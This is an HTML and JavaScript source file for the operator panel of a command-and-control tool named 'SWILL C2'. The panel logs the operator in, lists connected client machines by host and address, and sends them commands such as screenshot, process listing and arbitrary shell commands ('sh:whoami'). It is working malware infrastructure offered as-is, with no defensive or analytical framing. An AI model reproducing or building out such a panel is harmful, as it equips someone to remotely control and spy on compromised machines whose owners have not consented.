<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SWILL C2</title>
<style>
  body { font-family: monospace; background: #111; color: #ddd; margin: 0; padding: 20px; }
  h1 { color: #0f0; }
  input, button, select { background: #222; color: #ddd; border: 1px solid #444; padding: 6px; margin: 4px; }
  button { cursor: pointer; }
  button:hover { background: #333; }
  #clients { margin-top: 20px; }
  .client { border: 1px solid #333; padding: 10px; margin: 8px 0; }
  #output { background: #000; border: 1px solid #333; padding: 10px; min-height: 200px; white-space: pre-wrap; margin-top: 20px; }
  .hidden { display: none; }
</style>
</head>
<body>
<h1>SWILL C2</h1>

<div id="login">
  <input id="user" placeholder="username">
  <input id="pass" type="password" placeholder="password">
  <button onclick="doLogin()">Login</button>
</div>

<div id="panel" class="hidden">
  <div>
    <button onclick="loadClients()">Refresh clients</button>
    <button onclick="logout()">Logout</button>
  </div>
  <div id="clients"></div>
  <div>
    <input id="cmd" placeholder="command (e.g. screenshot, proclist, sh:whoami)" size="50">
    <select id="target"></select>
    <button onclick="sendCmd()">Send</button>
  </div>
  <div id="output"></div>
</div>

<script>
let token = localStorage.getItem("swill_token") || "";

function show() {
  document.getElementById("login").classList.toggle("hidden", !!token);
  document.getElementById("panel").classList.toggle("hidden", !token);
  if (token) loadClients();
}

async function doLogin() {
  const r = await fetch("/api/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      username: document.getElementById("user").value,
      password: document.getElementById("pass").value
    })
  });
  if (!r.ok) { alert("login failed"); return; }
  const j = await r.json();
  token = j.token;
  localStorage.setItem("swill_token", token);
  show();
}

function logout() {
  token = "";
  localStorage.removeItem("swill_token");
  show();
}

async function loadClients() {
  const r = await fetch("/api/clients", {headers: {Authorization: "Bearer " + token}});
  if (!r.ok) { logout(); return; }
  const j = await r.json();
  const box = document.getElementById("clients");
  const sel = document.getElementById("target");
  box.innerHTML = "";
  sel.innerHTML = "";
  j.clients.forEach(c => {
    const d = document.createElement("div");
    d.className = "client";
    d.textContent = `${c.id} | ${c.host} | ${c.addr[0]}:${c.addr[1]}`;
    box.appendChild(d);
    const o = document.createElement("option");
    o.value = c.id;
    o.textContent = c.id;
    sel.appendChild(o);
  });
}

async function sendCmd() {
  const cmd = document.getElementById("cmd").value;
  const cid = document.getElementById("target").value;
  if (!cmd || !cid) return;
  const r = await fetch("/api/command", {
    method: "POST",
    headers: {"Content-Type": "application/json", Authorization: "Bearer " + token},
    body: JSON.stringify({client_id: cid, cmd})
  });
  const j = await r.json();
  document.getElementById("output").textContent += JSON.stringify(j) + "\n";
}

show();
</script>
</body>
</html>
